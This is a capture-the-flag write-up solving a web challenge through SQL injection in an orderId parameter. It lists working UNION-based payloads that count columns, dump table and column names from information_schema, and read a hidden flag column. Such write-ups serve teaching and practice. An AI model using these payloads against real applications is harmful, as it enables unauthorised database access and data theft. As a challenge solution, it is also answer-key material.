## Write-Up

SQL injection is in orderID parameter, which is used in order view form after order is made. The following steps can be followed to solve the task:

Post order and see orderId parameter such as `orderId=2` in the url

Check for sql injection with parameters `orderId=2-1` (will display order for orderId=1) or `orderId=1'` (will cause error).

Determine number of columns: `orderId=1 order by 8` . There are 8 columns because `orderId=1 order by 8` is succesfull, but `orderId=1 order by 9` returns error.

Execute `orderId=2222 union select 1,2,3,4,5,6,7,8` to make sure that we can see extracted result in the response.

Execute `orderID=1333 union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables --`  to extract tables from DB.

Find table `super_secret_table` in DB

Execute `orderID=1333 union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_name='super_secret_table' --`  to extract columns of that table.
 
Find column `super_secret_column`

Read flag with `orderID=1333 union select 1,super_secret_column,3,4,5,6,7,8 from super_secret_table --`